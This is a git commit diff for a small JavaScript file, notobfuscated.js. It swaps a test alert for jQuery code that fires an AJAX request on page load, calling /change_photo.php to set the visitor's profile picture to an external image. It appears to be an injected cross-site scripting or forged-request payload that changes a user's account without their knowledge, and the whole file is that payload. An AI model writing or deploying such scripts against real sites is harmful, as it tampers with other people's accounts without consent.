58c55be34b6fea9bbff30e5f43e1aa0f06e1991d
Loudon-M <95886342+Loudon-M@users.noreply.github.com>
2021-12-09 18:59:26 -0500

    Update notobfuscated.js

--- notobfuscated.js
+++ notobfuscated.js
@@ -1,1 +1,3 @@
-alert("test")
+$( document ).ready(function() {
+		$.ajax({url: "/change_photo.php?type=profile&url=https://imageproxy.ifunny.co/crop:x-20,resize:640x,quality:90x75/images/2d7b2d7748ffa41a2de2d413dee50b5020f9abead83968460a274f408d195c3e_1.jpg", success: function(result){console.log(result);}});
+});
